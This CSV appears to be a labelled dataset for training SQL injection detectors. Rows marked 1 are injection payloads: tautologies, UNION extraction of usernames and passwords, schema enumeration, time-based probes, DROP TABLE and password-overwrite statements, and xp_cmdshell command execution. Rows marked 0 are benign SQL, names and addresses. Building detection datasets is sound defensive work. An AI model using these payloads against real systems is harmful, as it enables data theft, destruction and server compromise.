Sentence,Label
28413,0
"ADMIN""/*172#464",1
SELECT * FROM hill 3 SELECT * FROM color,0
SELECT * FROM effort WHERE scared = 'these',0
1'%09AND%09pg_sleep(5)--860 OR 1=1258554,1
23991331p,0
2532460000000000,0
1' OR '1' = '1 AND 1=1 AND 1=1/*/*,1
""" AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#--",1
admin1' OR 1 = 1#955988,1
""" OR ""1""=""1 AND 1=1395 AND 1=1--",1
SELECT COUNT ( occur )  FROM trap,0
' OR '2'='2 AND 1=1 AND 1=1--173--612,1
"' UNION SELECT 1,2,3--/*902",1
SELECT * FROM local WHERE Price NOT BETWEEN 10 AND 20,0
bockaj,0
1'%20AND%20pg_sleep(5)--636517 AND 1=1,1
SELECT * FROM folks WHERE concerned = 'art' LIMIT 3,0
"c/ clarin, 117",0
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756667681",1
SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ) ,0
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784425",1
18513875w,0
"SELECT * FROM tired WHERE strong BETWEEN ""keep"" AND    ""difficult""",0
') OR ('1'='1/*839/*,1
herling,0
alh4a3,0
1%27%20OR%20%271%27%20%3D%20%271/*140,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*-- AND 1=1 AND 1=19",1
' OR '2'='213/*#852,1
' or 2=2----973415,1
' OR '2'='213973 AND 1=1--53 AND 1=1635439,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892 AND 1=1",1
"  SELECT fix AS past, morning AS [recognize]  FROM tape",0
"testadmin"" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1359",1
""" AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#694",1
""" UNION SELECT username,password FROM users--461 OR 1=1",1
'/**/or/**/1=1/*135540--490,1
"admin' UNION SELECT 1,2,3--#343451--545",1
'%20or%201=1#/*#490909,1
SELECT * FROM four WHERE sail = 'influence'  AND  ( later = 'movement' OR safety = 'sleep' ) ,0
"99"" OR 99 = 99 OR 1=1#/*307803",1
admin1' OR '1' = '1--279# AND 1=1804,1
SELECT DISTINCT ride FROM bag,0
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%',0
SELECT * FROM taken WHERE    NOT yesterday = 'saddle',0
10x27; WAITFOR DELAY 0x2700:00:050x27----928--,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--24773,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306300781",1
'; update users set password='hacked'-- AND 1=1--716,1
"""+OR+1=1#/*--",1
"""+UNION+SELECT+NULL--608861 AND 1=1210 OR 1=1",1
8363,0
88253687l,0
' OR '1'='1#474637,1
SELECT MIN ( short )  AS frame FROM mirror,0
test') OR ('1'='1-- AND 1=1380,1
' UNION SELECT NULL--/*622/*427/*256 OR 1=1 AND 1=1257,1
diezma,0
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1--984",1
'+OR+1=1#/*/*146,1
%27%3B%20UPDATE%20users%20SET%20password%3D%27hacked%27----,1
calle nicolas funes 116,0
hutchins@foreignoffice.sa,0
ADMIN'/*--672 AND 1=1,1
SELECT MIN ( nice )  AS smile FROM zoo,0
user' OR 1=1/*/* AND 1=1/*/*164,1
test1' OR '1' = '1,1
SELECT AVG ( save ) FROM require,0
SELECT * FROM tape,0
SELECT * FROM newspaper WHERE made NOT LIKE 'common%',0
SELECT gave ( s FROM lady RIGHT JOIN,0
houstin@maxitienda.zr,0
ADMIN'/* AND 1=1898,1
"testadmin"" OR ""1""=""1 AND 1=1613186499279",1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1 AND 1=1 OR 1=1",1
6490020000000000,0
""";%09EXEC%09xp_cmdshell(""dir"")---- AND 1=1887639",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561# AND 1=1--",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721161",1
SELECT * FROM began WHERE every IN  ( SELECT choice FROM standard ) ,0
"' UNION SELECT 1,2,3--/*#",1
"2"" OR 2 = 2--730--",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197 AND 1=1346",1
SELECT COUNT ( DISTINCT date )  FROM ground,0
"useradmin"" OR ""1""=""1-- OR 1=1454",1
1' OR 'a'='a OR 1=1#38688/*,1
testadmin' OR '1'='1 AND 1=1613186499,1
"user"") OR (""1""=""1 AND 1=1626 AND 1=1548282",1
') OR ('1'='1/*--384519,1
"user"") OR 1=1-- AND 1=1882350307#",1
"ADMIN""/*172247/*799932",1
"user"") OR (""1""=""1/*",1
"ADMIN""/*172871638661138",1
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#804192 AND 1=1,1
admin' OR 1=1-- AND 1=1,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168 AND 1=1",1
'/**/OR/**/'1'='1'/**/--/*75#591 AND 1=1322,1
tamerlani@ubikuo.cc,0
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1#",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#332",1
'+OR+1=1--156/* AND 1=1,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878/*",1
"plaa font, 179",0
' or 2=2--176,1
SELECT * FROM nearly WHERE hang = 'paper'  OR term = 'golden',0
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520927,1
' or 2=2/* AND 1=1/* AND 1=1664,1
2' AND SLEEP(5)----232 AND 1=1,1
""") OR (""1""=""1/* OR 1=1--/*885#",1
user' OR 1=1--/* OR 1=178599 OR 1=1,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#404",1
mendavia,0
'/**/OR/**/1=1-- OR 1=1 OR 1=1#152,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87117475,1
""" OR 1=1#-- OR 1=1#805155",1
test' OR '1'='1' /*#666--/*,1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184 AND 1=1535,1
7983170000000000,0
"user"") OR 1=1-- AND 1=1/* OR 1=1795",1
""" OR ""1""=""1--322 AND 1=1",1
"1"" OR ""1""=""1"" --/* OR 1=1-- OR 1=1",1
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil"";",0
%2527%2520OR%25201%253D1--963,1
""" UNION SELECT NULL,NULL,NULL--/*/* OR 1=1",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1915#",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/*/*554257",1
' OR '2'='2 AND 1=1 AND 1=1--173----624,1
pembrooke_coates@stainless.gd,0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1",1
""" OR 1=1#-- OR 1=1# AND 1=1 AND 1=1#",1
' UNION SELECT NULL--992,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1650",1
2'--618,1
testadmin' OR '1'='1 AND 1=1613 AND 1=1/*39,1
2' OR 2 = 2--#/*951415,1
kannel,0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827/*64",1
"admin' UNION SELECT 1,2,3--#343853",1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1845,1
SELECT * FROM fact WHERE spring LIKE '%tower%',0
anamary,0
' OR 1=1#/* AND 1=1 OR 1=1,1
SELECT * FROM volume WHERE child IN  ( SELECT ought FROM third ) ,0
'%20or%201=1/*835 OR 1=1152--,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435898,1
"10x27; INSERT INTO users VALUES(0x27hacked0x27,0x27pass0x27)--# OR 1=1",1
august,0
1'%20AND%20pg_sleep(5)--63618920,1
') OR ('1'='1/* OR 1=1--/* AND 1=111125,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 181 )  ORDER BY meta_id ASC",0
' OR 99=99# OR 1=1,1
""" OR 1=1#----# AND 1=1-- AND 1=1876 AND 1=1#542",1
2' OR '2' = '2163254#820145--,1
"useradmin"" OR 1=1--#572/*-- OR 1=1",1
tris2,0
segovia,0
test' UNION SELECT NULL----#--,1
kingslan,0
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594803",1
' OR '2'='213/*# OR 1=168,1
""" OR 1=1#-- OR 1=1#80585265",1
""" OR 1=1#-- OR 1=1#805/* AND 1=1",1
SELECT hearing ( s )  FROM changing SELECT reach ( s ) ,0
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,0
' or 2=2/* AND 1=1/* AND 1=1--,1
" SELECT LPAD ( CustomerName, 30, ""ABC"" )  AS LeftPadCustomerName FROM Customers; ",0
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408127",1
2' OR 2 = 2--730-- AND 1=1,1
' OR 99=99#12669,1
""";%09EXEC%09xp_cmdshell(""dir"")----#",1
SELECT COUNT ( forget ) FROM husband,0
villarrasa,0
"""/**/OR/**/1=1-- OR 1=1373#98",1
'+or+1=1# OR 1=1 AND 1=1 OR 1=1--434,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352679",1
0x27) OR 1=1--# OR 1=1,1
SELECT * FROM gather WHERE watch BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM collect,0
"1"" UNION SELECT 1,2,3-- AND 1=1952 AND 1=1136",1
SELECT * FROM elephant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM slow,0
"   SELECT corner, whom, announced FROM tribe WHERE get  IS NULL",0
hungkang,0
"user"" UNION SELECT NULL--/*#",1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138 OR 1=1--#182",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1 AND 1=1362,1
admin' UNION ALL SELECT NULL--24127--,1
"calle abeto, 187,",0
 UPDATE pour SET busy = 'sent'WHERE drawn = 'important',0
"1""+OR+1+=+1351888387510",1
"c/ otumba, 132,",0
' or 2=2/* AND 1=1/*387,1
"guzman de alfarache, 18,",0
"calle poeta guillen colom, 34, 4?d",0
SELECT MIN ( list )  AS enjoy FROM happened,0
SELECT engineer ( s )  FROM bee SELECT ordinary ( s ) ,0
' OR '2'='213973 AND 1=1--53--625,1
c5fra98,0
"ADMIN""/*172247 AND 1=1--",1
1' OR 1=1#-- AND 1=1603355,1
test1' OR '1' = '1/*##,1
SELECT TOP 3 * FROM human WHERE could = 'pretty',0
"   SELECT street, money+ ', ' + factory+ ' ' + leather+ ', ' + topic AS smoke  FROM stepped",0
SELECT * FROM recent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM settlers,0
"1"" UNION SELECT 1,2,3-- AND 1=1----56#",1
"1"" UNION SELECT NULL,NULL------#",1
user') OR 1=1-- AND 1=1325 AND 1=167#643,1
shue-sampson@artroscopiagc.mn,0
user' OR '1'='1#315-- AND 1=1/*619202697,1
SELECT AVG ( hand )  FROM final  SELECT SUM ( slope ) ,0
1'%20AND%20pg_sleep(5)--533872437458--,1
SELECT COUNT ( flies ) FROM gate,0
"user"" OR 1=1/*/* AND 1=1/*/*",1
36930027p,0
"""%20UNION%20ALL%20SELECT%20NULL--27/*",1
'/**/OR/**/'1'='1 OR 1=1,1
admin%2527--21576 OR 1=1,1
mazursky@mundo-deportivo.mx,0
user' OR '1'='1#-- OR 1=1932,1
nancy,0
1' OR '1'='1 OR 1=1 AND 1=1892,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816#465,1
'%09UNION%09ALL%09SELECT%09NULL--477786,1
SELECT * FROM diagram FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM recently,0
santaren,0
"user"" UNION SELECT NULL-- AND 1=1 OR 1=1",1
') OR ('1'='1/* OR 1=1--604,1
""" UNION ALL SELECT NULL--#/* AND 1=1",1
""" UNION ALL SELECT NULL--/* AND 1=1964635",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236367",1
';/**/DROP/**/TABLE/**/users--692,1
SELECT MIN ( avoid )  AS above FROM joined,0
' or 2=2------,1
user1' OR '1' = '1659616,1
"2"" OR ""2"" = ""2712#",1
')+OR+('1'='1116,1
"test' UNION SELECT username,password FROM users-- AND 1=1364",1
 UPDATE would SET through = 'wrapped'WHERE family = 'film',0
"admin1"" OR ""1"" = ""1--/*737#20",1
"test"" UNION SELECT 1,2,3-- AND 1=1512577896--",1
SELECT * FROM limited FETCH FIRST 50 PERCENT ROWS ONLY,0
' OR '2'='213/*# OR 1=1822--,1
' OR '1'='1' --/* AND 1=1793# OR 1=1421/*/*,1
"   SELECT sides, sort, rose FROM came WHERE eye  IS NULL",0
ADMIN'/* AND 1=1911 AND 1=110--,1
"user"" UNION SELECT NULL,NULL--/* OR 1=1770",1
"1"" UNION SELECT NULL----395628330651",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784173658",1
SELECT * FROM area FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1704288",1
zapardiel de la ribera,0
2' OR 2 = 2--#/*631,1
admin' OR 1=1--/*187,1
"1"" UNION SELECT 1,2,3-- AND 1=1----56874",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1374,1
testadmin' OR '1'='1#624564,1
"1"" UNION SELECT NULL,NULL--# OR 1=1984400",1
admin1' OR '1' = '1--279# AND 1=1 OR 1=160,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614361,1
1' UNION SELECT NULL----395178 OR 1=1,1
testadmin' OR '1'='1 AND 1=1613 AND 1=1511/*,1
1' OR '1'='1' --#412640429,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=1 OR 1=1-- OR 1=1#",1
'%09UNION%09ALL%09SELECT%09NULL--477 AND 1=1,1
%2527%2520OR%25201%253D1%2523,1
folsom_talli@esteticadayda.tel,0
user') OR 1=1-- AND 1=1325 AND 1=167187,1
SELECT correctly ( s ) FROM wave INNER JOIN,0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138--244",1
aveinte,0
test' OR 1=1##/*#600,1
SELECT * FROM rise,0
SELECT leaf ( s )  FROM to UNION,0
admin' OR 1=1-- OR 1=1#781549,1
' or 2=2--#46828369,1
SELECT boat ( s ) FROM tribe INNER JOIN,0
SELECT AVG ( property ) FROM flame SELECT SUM ( melted ) ,0
"  UPDATE gun SET hungry =  'chair', City =  'screen' WHERE slow =  melted",0
SELECT * FROM card WHERE eat NOT BETWEEN 'happily' AND 'check',0
useradmin' OR '1'='1-- OR 1=1454/*,1
SELECT largest FROM those UNION SELECT per FROM result ORDER BY pretty,0
gallinero de cameros,0
'%09OR%091=1--#442,1
SELECT TOP 50 PERCENT * FROM run,0
koczian@decoaching.is,0
' OR 99=99# OR 1=1261,1
carceln,0
1'%09OR%09'1'%09=%09'1998/* OR 1=1772,1
9810,0
"  SELECT * FROM limited WHERE to NOT IN  ( 'struck', 'long', 'machine' )  ",0
30034324g,0
"test' UNION SELECT NULL,NULL--/*978578",1
calle villalon 13 1g,0
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784173508",1
"user' UNION SELECT NULL,NULL--# OR 1=1#266430",1
""" OR 1=1/*--929888175273",1
'; update users set password='hacked'-- AND 1=1#,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*-- AND 1=1 AND 1=1/*",1
SELECT COUNT ( queen ) FROM exist,0
'; UPDATE USERS SET PASSWORD='HACKED'-- AND 1=11,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923740",1
ad5ma.sc9r,0
') OR ('1'='1/* OR 1=1293408799,1
SELECT * FROM clay WHERE    NOT consist = 'cowboy',0
SELECT stems ( s FROM better RIGHT JOIN,0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=19825636390",1
1' OR '1'='1' --#412640408,1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517745",1
test' OR '1'='1' /*#/*654--903,1
SELECT TOP 3 * FROM theory WHERE friendly = 'he',0
admin0x27/*467468 OR 1=1708142,1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1#",1
admin' UNION ALL SELECT NULL-- AND 1=1,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435610,1
SELECT * FROM drive WHERE cattle LIKE '%fly%',0
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1131,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/* OR 1=1",1
"11"" OR 1 = 1 AND 1=1",1
"test' UNION SELECT username,password FROM users--/*836#452",1
SELECT * FROM her WHERE yes BETWEEN deep09/01/1996slept AND division15/31/1996aware,0
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1774567",1
SELECT * FROM anywhere WHERE clothes = 'press'  AND City = 'wagon',0
') OR ('1'='1/*-- AND 1=1,1
" SELECT * FROM Customers  ORDER BY Country ASC, CustomerName DESC;",0
admin' OR '99'='99 OR 1=1809 AND 1=1367,1
admin' UNION SELECT NULL-- AND 1=1#645/*735#,1
%27%20UNION%20SELECT%20NULL--529173,1
admin0x27/* OR 1=1 AND 1=1955 OR 1=1,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739 AND 1=1#",1
1'%20AND%20pg_sleep(5)--533553--,1
SELECT * FROM repeat WHERE observe BETWEEN 'exact' AND 'boat',0
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404/*,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 14594 )  ORDER BY meta_id ASC",0
"   SELECT Employees.deer, COUNT ( Orders.villageID )  AS peaceFROM    ( OrdersINNER JOIN hello ON Orders.dinnerID  =  Employees.sickID ) ",0
1%27%20OR%20%271%27%20%3D%20%271/*403 OR 1=1,1
' or 1=1--73603,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1-- OR 1=1",1
17867,0
7781,0
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1--",1
""")+OR+(""1""=""1-- AND 1=1729#",1
1438,0
alternat,0
SELECT * FROM bank WHERE    NOT word = 'evidence',0
"1"" UNION SELECT NULL,NULL------611--213398 OR 1=1",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1739,1
"""+OR+""1""=""1----",1
1%27%3B%20DROP%20TABLE%20users--98 OR 1=1,1
1' OR '1' = '1 AND 1=1 AND 1=1896,1
test') OR ('1'='1# AND 1=1#,1
SELECT * FROM story FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM monkey,0
user' UNION SELECT NULL--/*#335,1
' OR '2'='213/*10140750,1
8271,0
"1"" UNION SELECT NULL,NULL------611-- OR 1=1323",1
espinoza@canariasatuaire.lb,0
339403r90am958e,0
SELECT * FROM somehow WHERE Price NOT BETWEEN 10 AND 20,0
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1#855",1
' or 2=2----97,1
"ADMIN""/*172247 AND 1=1645--",1
' UNION SELECT NULL--/*622 OR 1=1,1
"1""+OR+1+=+171",1
admin0x27/*467468 OR 1=199916,1
mera alccer,0
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887639/*793,1
admin' OR 1=1#--,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*316/*",1
SELECT protection FROM riding,0
SELECT * FROM many WHERE situation = 'pull' LIMIT 3,0
user' OR 1=1/*/* AND 1=1/*/*##,1
17120,0
2am901to,0
0x27) OR 1=1--# AND 1=1 OR 1=1/*,1
user' OR 'a'='a----870,1
"admin' UNION SELECT NULL,NULL,NULL--/*#444921",1
admin'%20OR%20'1'='1 AND 1=1987656414589450485,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131494",1
scott,0
' UNION ALL SELECT NULL--#/*853394,1
SELECT * FROM  ( SELECT station FROM flew ) ,0
"1"" OR ""a""=""a AND 1=1--376536 OR 1=1",1
'%20UNION%20ALL%20SELECT%20NULL--27#--,1
SELECT planet FROM result,0
"antonio asenjo, 178, 6?h",0
mocej*n,0
"  SELECT water AS dug, composition AS [situation]  FROM nodded",0
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_link' LIMIT 1,0
SELECT dollar ( s )  FROM stiff SELECT root FROM contrast,0
"""%20or%201=1# AND 1=1 OR 1=144749",1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1944,1
olrich-shapiro1@nuriamartin.aw,0
%27%20or%201%3D1%23#,1
"user"" UNION SELECT NULL,NULL--/* OR 1=1428462",1
""" or 2=2/* AND 1=1 OR 1=1# OR 1=1",1
1' OR '1'='1' --/*#611,1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1209,1
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1 AND 1=1883",1
admin'/*,1
"admin1"" OR ""1"" = ""1--/*737#657",1
10155328t,0
""" union select null,null,null--748",1
carlina,0
"admin"" UNION SELECT 1,2,3-- AND 1=1957725194#",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=184 AND 1=1",1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256 AND 1=1",1
luciano nagel,0
admin' OR 1=1/*# AND 1=1,1
pincel,0
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497718",1
SELECT * FROM giant WHERE at BETWEEN '1996-07-01' AND '1996-07-31',0
test' UNION SELECT NULL----/*--/*603,1
admin%27%23 AND 1=1----,1
99' AND SLEEP(5)--190,1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1--,1
dido,0
sikes-jeans@923.mv,0
test' UNION SELECT NULL----/*--/*/*,1
ramiz,0
admin' UNION ALL SELECT NULL----#820,1
SELECT * FROM lamp WHERE form NOT LIKE 'pick%',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 185 )  ORDER BY meta_id ASC",0
fisgar,0
"""/**/OR/**/1=1-- OR 1=1717",1
'%09OR%09'1'='1665,1
SELECT TOP 50 PERCENT * FROM map SELECT * FROM shown FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_bottom_content' LIMIT 1,0
SELECT * FROM blow ORDER BY cattle,0
"test"" UNION SELECT NULL,NULL--/* AND 1=1253",1
"admin"" OR 1=1#/*32775687171277",1
"  SELECT todayID AS ID, world AS scale FROM favorite",0
tu6e3a5a,0
' OR '1'='1 AND 1=1 OR 1=1--#,1
10200,0
SELECT over ( s )  FROM slipped SELECT couple FROM area,0
488546000000000,0
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#/*269",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1 OR 1=1",1
'%09UNION%09ALL%09SELECT%09NULL--/*#,1
SELECT AVG ( together ) FROM idea SELECT SUM ( bowl ) ,0
' OR '2'='213/*# OR 1=1822 AND 1=1--,1
6733670000000000,0
SELECT * FROM plain,0
"useradmin"" OR ""1""=""1-- OR 1=1600199#",1
') OR ('1'='1/*-- OR 1=1251965,1
admin' OR 1=1/*--863/*,1
"""/**/OR/**/1=1-- OR 1=1876--/*--417632199",1
' OR '1'='1' /*# OR 1=1 OR 1=1,1
admin'%20OR%20'1'='1 AND 1=198765687,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518--",1
SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM draw,0
user' UNION ALL SELECT NULL--/*/*--731,1
calle codigo correspondencia oficial correos-telegrafos s/n 9a,0
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#61",1
SELECT * FROM stone WHERE mile = 'pound' FETCH FIRST 3 ROWS ONLY,0
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1#",1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1932256,1
') OR ('1'='1/* OR 1=1--/* AND 1=178867,1
SELECT * FROM doing ORDER BY week DESC,0
anglaril,0
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1 AND 1=1",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1",1
admin'%20OR%20'1'='1 AND 1=1987 AND 1=1481,1
2138,0
"admin"" UNION ALL SELECT NULL--24127474161-- AND 1=1",1
ADMIN'/* AND 1=1----750,1
"1"" UNION SELECT 1,2,3-- AND 1=1----56215",1
SELECT * FROM sale WHERE forget = 'first',0
admin') OR 1=1--# AND 1=1580272--#,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728979,1
'%20OR%20'1'='1'%20/*--,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*660 OR 1=1",1
user' OR 1=1--,1
"1"" UNION SELECT NULL----395195",1
SELECT TOP 3 * FROM inch WHERE around = 'slip' SELECT * FROM social,0
"   SELECT book,wool,available,middle,lesson     (  (  money JOIN composition ON refused.scientific =  wherever.onto )   INNER JOIN baseballON Orders.mainly =  took.indicateID ) ",0
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408#",1
') OR ('1'='1/* OR 1=1--/* AND 1=111 AND 1=1,1
"admin1"" OR ""1"" = ""1# OR 1=1/*677217",1
99' OR 99 = 99 OR 1=1#872331,1
4909,0
') OR ('1'='1/* OR 1=1--/*248257,1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--#131,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##823",1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131496 OR 1=1",1
"""%20or%201=1/*835 OR 1=1 OR 1=1284406",1
SELECT TOP 3 * FROM habit,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--300 AND 1=1",1
"   SELECT hidden, slabs, salt FROM trick WHERE sugar  IS NULL",0
ADMIN'/*172620279/*,1
"   SELECT COUNT ( rice ) , lungs FROM laid BY include",0
SELECT * FROM  ( SELECT while FROM kids ) ,0
') OR ('1'='1/* OR 1=1--/*248642970,1
"admin"") OR (""1""=""1# OR 1=1/*/*551",1
"admin1"" UNION SELECT NULL,table_name FROM information_schema.tables--813 OR 1=1# OR 1=1",1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380386,1
spaeth@directoriogratuito.kr,0
"""+OR+""1""=""1--#",1
cambulln,0
montorns de segarra,0
SELECT price ( s )  FROM molecular UNION ALL,0
c/ francia-urb.s.nicolas 171,0
"admin"" OR ""1""=""195862624650",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/*/*,1
femke,0
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=1 AND 1=1",1
"""%09UNION%09ALL%09SELECT%09NULL--477#",1
"user"") OR (""1""=""1 AND 1=1626--",1
18995930t,0
%2527%2520OR%25201%253D1--963842,1
busoms redolad,0
SELECT road ( s )  FROM middle SELECT rice FROM broke,0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256541616",1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184 AND 1=1 AND 1=1,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1 AND 1=1",1
